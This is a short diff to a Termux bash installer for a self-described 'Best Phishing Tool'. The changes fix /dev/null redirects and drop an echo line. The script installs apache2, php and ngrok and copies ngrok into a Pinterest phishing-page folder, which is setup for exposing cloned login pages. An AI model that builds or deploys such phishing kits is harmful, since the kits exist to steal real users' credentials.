@@ -5,7 +5,7 @@ echo
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m"
 echo
 termux-setup-storage
-pkg update > dev/null 2>&1
+pkg update > /dev/null 2>&1
 apt-get install apache2 -y
 apt install php -y
 apt install jq -y
@@ -23,7 +23,7 @@ echo -e "\e[31m[\e[32m~\e[31m]\e[33m Successfuly installed \e[m "
 echo
 echo -e "\e[31m[\e[32m~\e[31m]\e[33m Inflating ngrok \e[m "
 sleep 2
-unzip Ngrok_Linux_Droid.zip && rm -rf Ngrok_Linux_Droid.zip >> /dev/null 2>&1
+unzip Ngrok_Linux_Droid.zip >> /dev/null 2>&1 && rm -rf Ngrok_Linux_Droid.zip >> /dev/null 2>&1
 echo
 echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "
 sleep 2
@@ -63,7 +63,6 @@ cp -R ngrok phs/pinterest/
 clear
 echo ""
 echo ""
-echo " "
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit ngrok.com \e[m "
 sleep 2
 echo " "
